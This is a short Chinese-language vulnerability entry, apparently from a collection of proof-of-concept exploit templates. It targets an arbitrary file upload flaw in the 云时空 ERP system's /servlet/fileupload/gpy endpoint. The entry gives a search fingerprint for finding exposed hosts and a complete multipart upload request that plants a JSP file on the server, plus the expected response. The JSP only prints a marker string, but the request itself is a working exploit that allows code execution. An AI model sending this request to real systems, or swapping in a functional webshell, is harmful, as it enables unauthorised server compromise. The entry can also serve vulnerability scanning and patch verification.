# 云时空社会化商业ERP系统gpy任意文件上传漏洞RCE

- **系统**：云时空社会化商业ERP系统gpy　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="云时空社会化商业ERP系统"`
- **请求**：`POST /servlet/fileupload/gpy HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A13…`

**请求体 / payload**
```
--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<% out.println("dudesuite"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```
- **预期**：200　|　jspdate